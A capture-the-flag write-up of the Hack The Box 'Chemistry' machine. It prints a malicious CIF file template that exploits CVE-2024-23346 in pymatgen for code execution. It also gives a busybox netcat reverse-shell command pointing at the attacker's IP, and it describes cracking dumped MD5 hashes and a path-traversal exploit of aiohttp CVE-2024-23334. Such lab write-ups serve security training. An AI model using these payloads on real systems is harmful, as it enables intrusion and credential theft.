![image](https://github.com/user-attachments/assets/81146324-46a2-4112-a69d-7cd2f5ea7918)

<br>

**PLATFORM : Hack The Box**

**BOX : Chemistry**

**DIFFICULTY : Easy**

**OS : Linux**

**AUTHOR: Francesco Basile**

<br><br>

The inital nmap scans reveals two ports open, 22 and 5000.

<br>

`$ nmap -sVC --version-intensity 9 -p 22,5000 -Pn --disable-arp-ping -n chemistry -oN nmap/versions-scan.txt`

`Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org/) ) at 2024-10-22 23:37 CEST`  
`Nmap scan report for chemistry (10.10.11.38)`  
`Host is up (0.51s latency).`

`PORT STATE SERVICE VERSION`  
`22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)` 
`5000/tcp open upnp?` 
`| fingerprint-strings:`  
`| GetRequest:`  
`| HTTP/1.1 200 OK`  
`| Server: Werkzeug/3.0.3 Python/3.9.5`  
`| Date: Tue, 22 Oct 2024 21:37:54 GMT`  
`| Content-Type: text/html; charset=utf-8`  
`| Content-Length: 719`  
`| Vary: Cookie`  
`| Connection: close`  
`|`
`| class="title">Chemistry CIF Analyzer`  
`|`
`Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.`

`<---SNIP--->`


<br><br>

The application hosted on the box at port 5000 looks like a parser for *Crystallographic Information Files (CIF)*.

<br>

![Pasted image 20241023002915-1](https://github.com/user-attachments/assets/b84120fa-fbe7-4534-844a-105686aa94f8)

<br><br>

Surfing the web i find the recent *CVE-2024-23346* 

https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0

A vulnerability in the parsing library *Pymatgen versions prior to 2024.2.8*, that executes arbitrary code via *insecure serializazion*.

All you need to do is craft a malicious .cif file, and then inject the command you want to execute in it. We have a template of the file's structure in the link above:

<br>

> data_Example
>
> audit_creation_date            2018-06-08
> 
> _audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"
> 
> loop
> 
> parent_propagation_vector.id
> 
> _parent_propagation_vector.kxkykz
> 
> k1 [0 0 0]
> 
> 
> _space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ()._class_._mro_[1]._getattribute_ ( *[().__class__.__mro__[1]]+["_sub" + "classes_"]) () if d._name_ == "BuiltinImporter"][0].load_module ("os").system ("<INSERT_PAYLOAD>");0,0,0'
> 
> 
> 
> _space_group_magn.number_BNS  62.448
> 
> _space_group_magn.name_BNS  "P  n'  m  a'  "
> 
> 

<br><br>

Experimenting with an active handler and a series of bash payloads from https://www.revshells.com/, i find the right one to be:

<br>

> *busybox nc 10.10.15.56 1337 -e sh*

<br><br>

Which allows me to gain a reverse shell:

<br>

![Pasted image 20241023004209-1](https://github.com/user-attachments/assets/863f5c8e-9fd9-4335-832c-3b353981df40)


<br><br>

Checking the app's directory, i'm able to retrieve the .db database that has stored all the *users passwords md5 hashes*, encoded with the following algorythm, as i can read in the *app.py* file.

<br>

>    hashed_password = hashlib.md5(password.encode()).hexdigest()

<br>

![Pasted image 20241023010333-1](https://github.com/user-attachments/assets/4d608551-6f3c-4efa-aa7f-12c6edfd4eac)

<br>

![Pasted image 20241023010740-1](https://github.com/user-attachments/assets/23efb1d7-f3bc-4c83-90d7-86ee6a9ee831)

<br><br>

A quick hop to https://crackstation.net reveals me the cleartext password of rosa's user:

<br>

![Pasted image 20241102202421](https://github.com/user-attachments/assets/f75f982e-c7e4-4475-aaef-a51aa3d913ff)

<br><br>

And finally i get an initial foothold on the machine. I have a set of credentials to access ssh:

<br>

> *rosa:<ROSA'S_PASSWORD>*

<br><br>

Running linpeas.sh on the machine, i find out a *service listening on port 8080*, localhost

<br>

![Pasted image 20241023012150-2](https://github.com/user-attachments/assets/e23684f0-94c2-458f-bc70-886c0c5d34ca)

<br><br>

To enumerate this service, i make up an *SSH tunneling* to our remote host, using the following command:

<br>

`ssh -L 8080:localhost:8080 rosa@10.10.11.38`

<br><br>

This forwards *my local* 8080 port  to the remote machine's local 8080 port. 

<br>

(Attacking Box 127.0.0.1:8080 ----> Victim Box 127.0.0.1:8080)

<br>

It basically means that i can direct external traffic, like a scan or even access the service from a browser if possible, to an internal service on a remote machine that otherwise would be accessible only from the box itself.
Nmap shows me that Chemistry is running *aiohttp 3.9.1*...

<br>

![Pasted image 20241102200205](https://github.com/user-attachments/assets/cf5b4ec4-b9b7-4c90-b592-e9532b9966f0)

<br><br>

...and this is the first result if i search it on google:

<br>

https://github.com/z3rObyte/CVE-2024-23334-PoC

<br><br>

It looks like aiohttp software it is vulnerable to *path traversal* up to version *3.9.1*. I'm going to modify a bit the script to make it run on *my* localhost's port 8080 and redirecting the exploit to the internal service, trying to read *root's flag*. 

<br>

![Pasted image 20241102200634](https://github.com/user-attachments/assets/ade0fe67-0d57-48da-a028-0c308f1ffe52)

<br><br>

And...

<br>

![Pasted image 20241102201153](https://github.com/user-attachments/assets/40bfecd8-d215-4b34-abe2-ae06e139e189)

<br><br>

Success! I have partial root access that can be leveraged to a shell and eventual full compromise of the box!
